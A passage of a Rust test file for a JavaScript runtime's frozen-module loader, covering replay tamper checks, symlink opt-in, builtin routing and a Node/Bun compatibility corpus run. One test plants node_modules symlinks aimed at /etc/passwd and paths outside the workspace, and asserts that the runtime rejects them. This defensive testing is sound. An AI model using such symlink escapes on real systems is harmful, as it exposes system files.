    std::fs::rename(&app, workspace.path().join("saved-app.cjs")).unwrap();
    let replay = reexecute(&capture).expect("offline nested CJS replay");
    assert!(replay.matched, "{replay:?}");
    assert!(!replay.module_load_disabled);
    assert!(replay.console_match && replay.host_effects_match);
    assert_eq!(replay.ir4_witness_match, Some(true));
    assert!(
        !app.exists() && !package.exists(),
        "replay must not extract source files",
    );

    // Keep the original struct field order, so each probe reaches its intended
    // source validator rather than only the canonical-JSON guard. Recomputing
    // the envelope digest does not authenticate these adversarial captures.
    let raw = &capture.payload_json;
    let replace_field = |field: &str, old: &serde_json::Value, new: &serde_json::Value| {
        let key = serde_json::to_string(field).unwrap();
        let needle = format!("{key}:{}", serde_json::to_string(old).unwrap());
        assert_eq!(raw.matches(&needle).count(), 1, "unique {field} probe");
        raw.replacen(
            &needle,
            &format!("{key}:{}", serde_json::to_string(new).unwrap()),
            1,
        )
    };
    let wrong_pin = serde_json::json!(format!("sha256:{}", "0".repeat(64)));
    for mutation in 0..7 {
        let (payload_json, expected_error) = match mutation {
            0 => {
                let sources = serde_json::to_string(&payload["module_sources"]).unwrap();
                let needle = format!(",\"module_sources\":{sources}");
                assert_eq!(raw.matches(&needle).count(), 1);
                (
                    raw.replacen(&needle, "", 1),
                    "module source capture is required",
                )
            }
            1 => (
                replace_field(
                    "capsule_digest",
                    &payload["module_sources"]["capsule_digest"],
                    &wrong_pin,
                ),
                "invalid frozen replay module capsule",
            ),
            2 => (
                replace_field(
                    "graph_input_hash",
                    &payload["module_sources"]["graph_input_hash"],
                    &wrong_pin,
                ),
                "invalid frozen replay source graph",
            ),
            3 => (
                replace_field(
                    "source",
                    &payload["package"]["source"],
                    &serde_json::json!("console.log('changed');"),
                ),
                "frozen replay prepared source or syntax differs",
            ),
            4 => {
                let bytes = payload["module_sources"]["capsule_base64"]
                    .as_str()
                    .unwrap();
                let altered = format!(
                    "{}{}",
                    if bytes.starts_with('A') { "B" } else { "A" },
                    &bytes[1..],
                );
                (
                    replace_field(
                        "capsule_base64",
                        &payload["module_sources"]["capsule_base64"],
                        &serde_json::json!(altered),
                    ),
                    "invalid frozen replay module capsule",
                )
            }
            5 => (
                replace_field(
                    "source_file",
                    &payload["package"]["source_file"],
                    &serde_json::json!("changed-origin.cjs"),
                ),
                "frozen replay entrypoint differs",
            ),
            _ => (
                replace_field(
                    "capsule_base64",
                    &payload["module_sources"]["capsule_base64"],
                    &serde_json::json!("A".repeat(4 * 1024 * 1024)),
                ),
                "native replay payload must contain",
            ),
        };
        let mut changed = capture.clone();
        changed.payload_json = payload_json;
        changed.payload_sha256 = hex::encode(Sha256::digest(changed.payload_json.as_bytes()));
        let error = reexecute(&changed).expect_err("source mutation must fail");
        assert!(
            error.contains(expected_error),
            "source mutation {mutation}: expected {expected_error:?}, got {error:?}",
        );
    }
}

#[test]
fn frozen_module_symlinks_require_frozen_execution_for_direct_callers() {
    let mut config = balanced_config();
    config.runtime.frozen_module_symlinks = Some(true);
    let dispatcher = EngineDispatcher::new(None, PreferredRuntime::FrankenEngine);
    let error = dispatcher.dispatch_run(
        Path::new("workspace-link-must-not-read.cjs"), &config, "balanced", &[], 0,
    ).expect_err("a frozen-only policy must not silently enable the live loader");
    assert!(error.to_string().contains("symlinks require frozen modules"), "{error:#}");
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_executes_contained_workspace_links_only_after_opt_in() {
    use std::os::unix::fs::symlink;

    let workspace = TempDir::new().unwrap();
    let package = workspace.path().join("packages/shared");
    std::fs::create_dir_all(&package).unwrap();
    std::fs::create_dir_all(workspace.path().join("node_modules")).unwrap();
    std::fs::write(package.join("package.json"),
        r#"{"name":"shared","version":"1.0.0","main":"index.cjs"}"#).unwrap();
    std::fs::write(package.join("index.cjs"),
        "module.exports=require('./answer.cjs');").unwrap();
    std::fs::write(package.join("answer.cjs"), "module.exports=42;").unwrap();
    symlink("../packages/shared", workspace.path().join("node_modules/shared")).unwrap();
    let app = create_test_app(workspace.path(), "app.cjs",
        "console.log('workspace',require('shared'));");
    let mut config = balanced_config();
    config.runtime.frozen_modules = Some(true);
    let rejected = invoke_product_supervisor(
        &app, &config, "balanced", Path::new(franken_node_bin()),
    ).unwrap();
    assert!(!rejected.status.success(), "links must be opt-in");
    assert!(!rejected.stdout.contains("workspace 42"));

    let accepted = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()),
        &["--frozen-module-symlinks"],
    ).unwrap();
    assert!(accepted.status.success(), "stdout={} stderr={}", accepted.stdout, accepted.stderr);
    let dispatch = parse_product_dispatch(&accepted).unwrap();
    assert_eq!(dispatch.captured_output.stdout, "workspace 42\n");
    let graph = dispatch.engine_decision.unwrap().frozen_modules.unwrap();
    assert!(graph.contained_symlinks);
    assert_eq!(graph.modules, 3);

    config.runtime.frozen_module_symlinks = Some(true);
    let accepted_from_config = invoke_product_supervisor(
        &app, &config, "balanced", Path::new(franken_node_bin()),
    ).unwrap();
    assert!(accepted_from_config.status.success(), "{}", accepted_from_config.stderr);
    let tightened = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()),
        &["--frozen-module-symlinks=false"],
    ).unwrap();
    assert!(!tightened.status.success(), "CLI false must override configured true");
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_symlink_opt_in_never_grants_external_or_cyclic_source_access() {
    use std::os::unix::fs::symlink;

    for target in ["../../outside.cjs", "/etc/passwd", "escape"] {
        let workspace = TempDir::new().unwrap();
        std::fs::create_dir_all(workspace.path().join("node_modules")).unwrap();
        symlink(target, workspace.path().join("node_modules/escape")).unwrap();
        let app = create_test_app(workspace.path(), "app.cjs",
            "console.log('WORKSPACE_ESCAPE_MUST_NOT_RUN'); require('escape');");
        let mut config = balanced_config();
        config.runtime.frozen_modules = Some(true);
        config.runtime.frozen_module_symlinks = Some(true);
        let output = invoke_product_supervisor(
            &app, &config, "balanced", Path::new(franken_node_bin()),
        ).unwrap();
        assert!(!output.status.success(), "unsafe target admitted: {target}");
        let diagnostics = format!("{}\n{}", output.stdout, output.stderr);
        assert!(diagnostics.contains("Frozen module graph capture failed"), "{diagnostics}");
        assert!(!diagnostics.contains("WORKSPACE_ESCAPE_MUST_NOT_RUN"), "{diagnostics}");
    }
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_executes_native_core_objects_in_installed_packages() {
    let workspace = TempDir::new().unwrap();
    let package_dir = workspace.path().join("node_modules/frozen-core");
    std::fs::create_dir_all(&package_dir).unwrap();
    std::fs::write(
        package_dir.join("package.json"),
        r#"{"name":"frozen-core","version":"1.0.0","main":"index.cjs"}"#,
    ).unwrap();
    std::fs::write(
        package_dir.join("index.cjs"),
        "const Buffer=require('node:buffer').Buffer; const qs=require('querystring'); module.exports={Buffer:Buffer,answer:qs.stringify({answer:42})};",
    ).unwrap();
    let app = create_test_app(
        workspace.path(), "app.cjs",
        "const b=require('buffer'); const value=require('frozen-core'); console.log(value.Buffer===b.Buffer,value.answer);",
    );
    let config = balanced_config();
    let output = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()), &["--frozen-modules"],
    ).unwrap();
    assert!(output.status.success(), "stdout={} stderr={}", output.stdout, output.stderr);
    let dispatch = parse_product_dispatch(&output).unwrap();
    assert_eq!(dispatch.captured_output.stdout, "true answer=42\n");
    let graph = dispatch.engine_decision.unwrap().frozen_modules.unwrap();
    assert_eq!(graph.modules, 4);
    assert_eq!(graph.routes, 4);
    assert!(!graph.graph_input_hash.is_empty());
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_executes_path_namespaces_shared_with_installed_packages() {
    let workspace = TempDir::new().unwrap();
    let package_dir = workspace.path().join("node_modules/frozen-path");
    std::fs::create_dir_all(&package_dir).unwrap();
    std::fs::write(
        package_dir.join("package.json"),
        r#"{"name":"frozen-path","version":"1.0.0","main":"index.cjs"}"#,
    )
    .unwrap();
    std::fs::write(
        package_dir.join("index.cjs"),
        r#"
const path = require('node:path');
module.exports = { path: path, make: function(value) { return path.join('root', value); } };
"#,
    )
    .unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        r#"
const path = require('path/posix');
const child = require('frozen-path');
const windows = require('node:path/win32');
console.log(child.path === path, path.win32 === windows, windows.posix === path);
console.log(child.make('file.txt'), windows.resolve('C:\\base', '..', 'out'));
path.join = function() { return 'shared mutation'; };
console.log(child.make('ignored'));
"#,
    );
    let config = balanced_config();
    let output = invoke_product_supervisor_with_options(
        &app,
        &config,
        "balanced",
        Path::new(franken_node_bin()),
        &["--frozen-modules"],
    )
    .unwrap();
    assert!(
        output.status.success(),
        "stdout={} stderr={}",
        output.stdout,
        output.stderr
    );
    let dispatch = parse_product_dispatch(&output).unwrap();
    assert_eq!(
        dispatch.captured_output.stdout,
        "true true true\nroot/file.txt C:\\out\nshared mutation\n"
    );
    let graph = dispatch.engine_decision.unwrap().frozen_modules.unwrap();
    assert_eq!(graph.modules, 5);
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_executes_path_esm_exports_with_captured_commonjs_packages() {
    let workspace = TempDir::new().unwrap();
    let package_dir = workspace.path().join("node_modules/frozen-path");
    std::fs::create_dir_all(&package_dir).unwrap();
    std::fs::write(
        package_dir.join("package.json"),
        r#"{"name":"frozen-path","version":"1.0.0","main":"index.cjs"}"#,
    )
    .unwrap();
    std::fs::write(
        package_dir.join("index.cjs"),
        "module.exports = { path: require('path'), windows: require('node:path/win32') };",
    )
    .unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.mjs",
        r#"
import path, { join } from 'node:path';
import * as namespace from 'path';
import * as canonical from 'node:path/posix';
import windows from 'path/win32';
import consumer from 'frozen-path';
console.log(path === consumer.path, windows === consumer.windows,
    canonical.default === path, canonical !== namespace);
console.log(join('root', 'file.txt'), windows.resolve('C:\\base', '..', 'out'));
path.join = function() { return 'shared mutation'; };
console.log(join('one', 'two'), consumer.path.join('ignored'));
import('path/posix').then(function(again) {
    console.log(again === canonical, again.default === path);
});
"#,
    );
    let config = balanced_config();
    let output = invoke_product_supervisor_with_options(
        &app,
        &config,
        "balanced",
        Path::new(franken_node_bin()),
        &["--frozen-modules"],
    )
    .unwrap();
    assert!(
        output.status.success(),
        "stdout={} stderr={}",
        output.stdout,
        output.stderr
    );
    let dispatch = parse_product_dispatch(&output).unwrap();
    assert_eq!(
        dispatch.captured_output.stdout,
        "true true true true\nroot/file.txt C:\\out\none/two shared mutation\ntrue true\n"
    );
    let graph = dispatch.engine_decision.unwrap().frozen_modules.unwrap();
    assert_eq!(graph.modules, 5);
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_refuses_unsupported_native_builtin_routes_before_execution() {
    for (filename, source) in [
        (
            "app.cjs",
            "console.log('FROZEN_CORE_MUST_NOT_RUN'); require('fs');",
        ),
        (
            "app.mjs",
            "import 'node:vm'; console.log('FROZEN_CORE_MUST_NOT_RUN');",
        ),
        (
            "app.cjs",
            "console.log('FROZEN_CORE_MUST_NOT_RUN'); import('node:vm');",
        ),
    ] {
        let workspace = TempDir::new().unwrap();
        let app = create_test_app(workspace.path(), filename, source);
        let mut config = balanced_config();
        config.runtime.frozen_modules = Some(true);
        let output =
            invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
                .unwrap();
        assert!(
            !output.status.success(),
            "unsupported route must not execute: {source}"
        );
        let diagnostics = format!("{}\n{}", output.stdout, output.stderr);
        assert!(
            diagnostics.contains("ERR_MODULE_REGISTRY_INCOMPLETE"),
            "{diagnostics}"
        );
        assert!(
            !diagnostics.contains("FROZEN_CORE_MUST_NOT_RUN"),
            "{diagnostics}"
        );
    }

    // Buffer is an implemented native provider. Keep the original static and
    // dynamic routes as positive controls rather than classifying them as
    // unsupported or removing them from coverage.
    for (filename, source) in [
        (
            "app.mjs",
            "import { Buffer } from 'node:buffer'; console.log(Buffer.from('native').toString());",
        ),
        (
            "app.cjs",
            "import('node:buffer').then(({ Buffer }) => console.log(Buffer.from('native').toString()));",
        ),
    ] {
        let workspace = TempDir::new().unwrap();
        let app = create_test_app(workspace.path(), filename, source);
        let mut config = balanced_config();
        config.runtime.frozen_modules = Some(true);
        let output =
            invoke_product_supervisor(&app, &config, "balanced", Path::new(franken_node_bin()))
                .unwrap();
        assert!(
            output.status.success(),
            "{source}: stdout={} stderr={}",
            output.stdout,
            output.stderr
        );
        let dispatch = parse_product_dispatch(&output).unwrap();
        assert_eq!(dispatch.captured_output.stdout, "native\n");
    }
}

/// Explicit release acceptance: real Cargo binary, full corpus, real references.
/// Select with `--ignored --exact full_project_compatibility_corpus --nocapture`.
/// References default to Node and Bun on PATH; the two environment overrides
/// select installed executable paths, whose identities the runner records.
/// Declare their exact `--version` output with the corresponding `_VERSION`
/// environment variables before executing the campaign.
#[test]
#[cfg(all(feature = "engine", target_os = "linux"))]
#[ignore = "Full native corpus requires Python, Node, Bun and declared reference versions"]
fn full_project_compatibility_corpus() {
    use sha2::{Digest, Sha256};
    use std::io::Read;

    const CORPUS_SHA256: &str =
        "sha256:6b82043e070ddb5ef146214ded6e892145811db65b617b165f55d18d5208487e";
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    // Keep private raw observations outside RCH's ephemeral source tree, on
    // failure as well as success. No signing keys are printed or published.
    let retained = tempfile::Builder::new()
        .prefix("franken-node-project-corpus-")
        .tempdir_in("/tmp")
        .expect("create private corpus evidence directory")
        .keep();
    eprintln!("full project corpus artifacts: {}", retained.display());
    let node =
        std::env::var("FRANKEN_NODE_PROJECT_CORPUS_NODE").unwrap_or_else(|_| "node".to_string());
    let bun =
        std::env::var("FRANKEN_NODE_PROJECT_CORPUS_BUN").unwrap_or_else(|_| "bun".to_string());
    let node_version = std::env::var("FRANKEN_NODE_PROJECT_CORPUS_NODE_VERSION")
        .expect("declare the Node reference version before running the corpus");
    let bun_version = std::env::var("FRANKEN_NODE_PROJECT_CORPUS_BUN_VERSION")
        .expect("declare the Bun reference version before running the corpus");
    let command = |directory: &Path, corpus_digest: &str| {
        let mut command = Command::new("python3");
        command.current_dir(&root).args([
            "-B",
            "scripts/project_compat_runner.py",
            "--corpus-dir",
            "fixtures/compatibility/projects",
            "--bin",
            franken_node_bin(),
            "--node",
            &node,
            "--bun",
            &bun,
            "--policy",
            "balanced",
            "--expect-corpus-sha256",
            corpus_digest,
            "--artifacts-dir",
        ]);
        command.arg(directory);
        // These are caller-only reference selectors and a compiler source
        // stamp. Pass selectors as arguments; the product binary already
        // embeds its build identity. All other ambient runtime overrides
        // remain visible to the runner's fail-closed environment check.
        for name in [
            "FRANKEN_NODE_PROJECT_CORPUS_NODE",
            "FRANKEN_NODE_PROJECT_CORPUS_BUN",
            "FRANKEN_NODE_PROJECT_CORPUS_NODE_VERSION",
            "FRANKEN_NODE_PROJECT_CORPUS_BUN_VERSION",
            "FRANKEN_NODE_GIT_SHA",
        ] {
            command.env_remove(name);
        }
        command
    };

    let override_directory = retained.join("runtime-override");
    let overridden = command(&override_directory, CORPUS_SHA256)
        .env("FRANKEN_NODE_RUNTIME_PREFERRED", "node")
        .output()
        .expect("exercise the unchanged ambient-override guard");
    std::fs::write(retained.join("override.stdout"), &overridden.stdout).unwrap();
    std::fs::write(retained.join("override.stderr"), &overridden.stderr).unwrap();
    assert_eq!(overridden.status.code(), Some(2));
    let override_error: serde_json::Value = serde_json::from_slice(&overridden.stdout).unwrap();
    assert_eq!(override_error["verdict"], "ERROR");
    assert!(
        override_error["detail"]
            .as_str()
            .unwrap()
            .contains("FRANKEN_NODE_RUNTIME_PREFERRED"),
        "{override_error}"
    );
    assert!(!override_directory.exists());

    // A different corpus must fail before starting runtimes or creating a
    // case directory. This negative uses the same real runner and inputs.
    let refused_directory = retained.join("wrong-corpus");
    let refused = command(
        &refused_directory,
        "sha256:0000000000000000000000000000000000000000000000000000000000000000",
    )
    .output()
    .expect("execute the wrong-corpus negative control");
    std::fs::write(retained.join("negative.stdout"), &refused.stdout).unwrap();
    std::fs::write(retained.join("negative.stderr"), &refused.stderr).unwrap();
    assert_eq!(refused.status.code(), Some(2));
    let refusal: serde_json::Value = serde_json::from_slice(&refused.stdout).unwrap();
    assert_eq!(refusal["verdict"], "ERROR");
    assert!(
        refusal["detail"]
            .as_str()
            .unwrap()
            .contains("corpus digest does not match"),
        "{refusal}"
    );
    assert!(!refused_directory.exists());

    let native_hash = || {
        let mut binary = std::fs::File::open(franken_node_bin()).unwrap();
        let mut hasher = Sha256::new();
        let mut bytes = [0_u8; 65_536];
        loop {
            let count = binary.read(&mut bytes).unwrap();
            if count == 0 {
                break;
            }
            hasher.update(&bytes[..count]);
        }
        format!("sha256:{}", hex::encode(hasher.finalize()))
    };
    let expected_native = native_hash();
    let cases = retained.join("cases");
    let status = command(&cases, CORPUS_SHA256)
        .stdout(std::fs::File::create_new(retained.join("runner.stdout")).unwrap())
        .stderr(std::fs::File::create_new(retained.join("runner.stderr")).unwrap())
        .status()
        .expect("execute all project cases with the real Cargo-built binary");
    assert_eq!(native_hash(), expected_native, "native binary changed");
    let report_path = cases.join("report.json");
    let report: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&report_path).unwrap_or_else(|error| {
            panic!(
                "no corpus report ({error}); retained evidence: {}",
                retained.display()
            )
        }))
        .expect("read the actual complete compatibility report");
    assert_eq!(report["candidate"]["sha256"], expected_native);
    for (role, expected) in [("reference", node_version), ("bun", bun_version)] {
        let version = &report["runtime_versions"][role];
        assert_eq!(version["valid"], true, "{role}: {version}");
        assert_eq!(version["stdout"].as_str().unwrap().trim(), expected);
    }
    assert_ne!(report["reference"]["sha256"], report["candidate"]["sha256"]);
    assert_ne!(
        report["bun_reference"]["sha256"],
        report["candidate"]["sha256"]
    );
    assert_ne!(
        report["bun_reference"]["sha256"],
        report["reference"]["sha256"]
    );
    assert_eq!(report["corpus_sha256"], CORPUS_SHA256);
    assert_eq!(report["corpus_case_count"], 170);
    assert_eq!(report["selected_case_count"], 170);
    assert_eq!(report["results"].as_array().unwrap().len(), 170);
    assert_eq!(report["policy"], "balanced");
    assert_eq!(report["limits"]["wall_time_ms"], 10_000);
    assert_eq!(report["limits"]["max_output_bytes_per_stream"], 1_048_576);
    eprintln!(
        "full project corpus: passed={} failed={} inconclusive={} verdict={}; artifacts={}",
        report["passing_cases"],
        report["failing_cases"],
        report["inconclusive_cases"],
        report["verdict"],
        retained.display()
    );
    assert!(
        status.success(),
        "native corpus failed; see {}",
        retained.display()
    );
    assert_eq!(report["verdict"], "PASS");
    assert_eq!(report["passing_cases"], 170);
    assert_eq!(report["failing_cases"], 0);
    assert_eq!(report["inconclusive_cases"], 0);
}
